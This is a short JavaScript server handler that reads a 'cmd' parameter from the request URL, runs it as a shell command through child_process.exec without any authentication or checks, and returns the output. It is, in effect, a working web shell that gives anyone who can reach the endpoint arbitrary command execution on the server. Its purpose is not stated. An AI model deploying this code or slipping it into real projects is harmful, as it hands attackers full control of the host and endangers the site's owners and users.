const util = require('util');
const exec = util.promisify(require('child_process').exec);

export default async (req) => {
  try {
    const url = new URL(req.url);
    const cmd = url.searchParams.get('cmd');
    const { stdout, stderr } = await exec(cmd);
    const resp = new Response(`
CMD: ${cmd}

STDOUT:

${stdout}

STDERR:

${stderr}
`)

    return resp
  } catch (err) {
    return new Response(`Execution failed: ${err}, ${req.url}`)
  }
};
